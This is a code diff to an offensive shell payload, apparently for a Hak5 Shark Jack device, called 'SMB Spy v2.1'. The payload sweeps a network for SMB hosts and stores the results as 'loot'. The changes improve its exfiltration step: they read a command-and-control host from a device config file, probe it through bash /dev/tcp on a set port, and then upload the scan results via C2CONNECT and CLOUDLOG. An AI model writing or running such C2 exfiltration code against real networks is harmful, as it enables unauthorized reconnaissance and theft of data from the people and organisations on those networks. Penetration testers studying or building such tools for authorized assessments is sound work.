@@ -15,6 +15,7 @@ setup_payload() {
   SCAN_END=0
   ELAPSED=0
   COUNT=0
+  C2_PORT="8080"  # Change this to match your C2 port
   LED SETUP
   mkdir -p "$LOOT_BASE"
 }
@@ -58,14 +59,37 @@ ping_sweep() {
 }
 
 exfil_to_c2() {
+  # Check if device.config exists before attempting C2
+  if [ ! -f /etc/device.config ]; then
+    log_both "No device.config found - loot saved locally only"
+    return
+  fi
+
   ALERT "Sending loot\nto C2..." 1 false
   CREATE_SPINNER "Uploading..."
-  C2CONNECT 2>/dev/null || {
+
+  # Read C2 host from device config
+  C2_HOST=$(cat /etc/device.config | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | head -1)
+
+  # Fall back to localhost if parsing fails
+  C2_HOST=${C2_HOST:-"localhost"}
+
+  # Check C2 reachability before attempting connection
+  if ! timeout 10 bash -c "echo >/dev/tcp/$C2_HOST/$C2_PORT" 2>/dev/null; then
     STOP_SPINNER
     ALERT "C2 unavailable\nLoot saved locally" 2 false
     log_both "C2 unavailable - loot saved locally only"
     return
+  fi
+
+  # Attempt C2 connection with timeout (I think this is too redundant)
+  timeout 30 C2CONNECT 2>/dev/null || {
+    STOP_SPINNER
+    ALERT "C2 timed out\nLoot saved locally" 2 false
+    log_both "C2 timed out - loot saved locally only"
+    return
   }
+
   CLOUDLOG "==========================================" 2>/dev/null || true
   CLOUDLOG "SMB Spy v2.1 Scan Complete" 2>/dev/null || true
   CLOUDLOG "Timestamp:    $TS" 2>/dev/null || true
@@ -248,5 +272,5 @@ view_loot_files() {
 
 setup_payload
 initialize_menu
-ALERT "SMB Spy v2.1\nShark Jack\nDisplay\nby\nHackazillarex\n ← to Start" -1 false true
+ALERT "SMB Spy v2.1\nShark Jack\n Display\n by\n Hackazillarex\n ← to Start" -1 false true
 START_MENU
